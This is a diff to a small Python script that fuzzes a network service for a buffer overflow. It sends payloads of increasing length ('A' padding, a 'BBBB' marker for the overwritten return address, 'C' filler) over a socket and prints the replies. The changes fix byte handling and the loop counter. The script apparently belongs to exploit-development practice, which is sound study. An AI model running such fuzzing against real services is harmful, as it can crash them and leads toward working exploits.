@@ -18,10 +18,12 @@ print(response)
 #try giving input of increasing lengths
 length = 0
 while (length < 1500):
-    payload = "A"*length + "BBBB" + "C"*10
+    payload = b"A"*length + b"BBBB" + b"C"*10
 
-    print("Sending Payload of size " + length)
-    sock.send(payload.encode())
+    print("Sending Payload of size " + str(length))
+    sock.send(payload)
 
     response = sock.recv(2048)
-    print(response)
+    response = sock.recv(2048)
+    print(response.decode())
+    length+=1
